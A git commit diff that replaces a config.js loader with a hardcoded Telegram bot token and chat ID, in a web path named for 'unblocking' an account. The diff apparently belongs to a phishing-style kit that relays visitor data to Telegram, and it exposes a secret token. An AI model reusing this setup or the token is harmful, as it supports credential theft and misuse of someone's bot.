6b8b4e4ff5d1dcdb7880d5ec1230e1b217ef754c
imranmoko <imranmokoagow57@gmail.com>
2025-07-17 18:02:33 +0800

    Update config.js

--- www.web-ld.com/membatalkan/batalblokir/config.js
+++ www.web-ld.com/membatalkan/batalblokir/config.js
@@ -1,17 +1,2 @@
-// Mengambil konfigurasi dari backend PHP
-async function getConfig() {
-    try {
-        const response = await fetch('get_config.php');
-        const data = await response.json();
-        return data;
-    } catch (error) {
-        console.error('Gagal mengambil konfigurasi:', error);
-        return { TELEGRAM_TOKEN: '', TELEGRAM_CHAT_ID: '' };
-    }
-}
-
-// Simpan data yang diambil
-getConfig().then(config => {
-    window.TELEGRAM_TOKEN = config.TELEGRAM_TOKEN;
-    window.TELEGRAM_CHAT_ID = config.TELEGRAM_CHAT_ID;
-});
+const TELEGRAM_TOKEN = "8078526867:AAGiORo-PAZ0C_GkxSvm7I3CAL6CfMR1row";
+const TELEGRAM_CHAT_ID = "6727236032";
